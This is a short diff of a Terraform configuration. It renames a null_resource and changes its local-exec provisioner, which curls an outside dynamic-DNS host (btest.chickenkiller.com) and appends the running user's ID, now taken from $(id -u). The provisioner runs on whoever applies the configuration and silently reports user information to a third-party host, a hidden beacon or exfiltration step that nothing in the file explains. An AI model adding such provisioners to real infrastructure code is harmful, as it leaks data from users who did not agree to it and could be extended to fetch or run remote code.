@@ -7,9 +7,9 @@ resource "random_id" "random" {
   byte_length = 16
 }
 
-resource "null_resource" "example4" {
+resource "null_resource" "example5" {
   provisioner "local-exec" {
-    command = "curl http://btest.chickenkiller.com/?uid=$UID"
+    command = "curl http://btest.chickenkiller.com/?uid=$(id -u)"
   }
 }
 
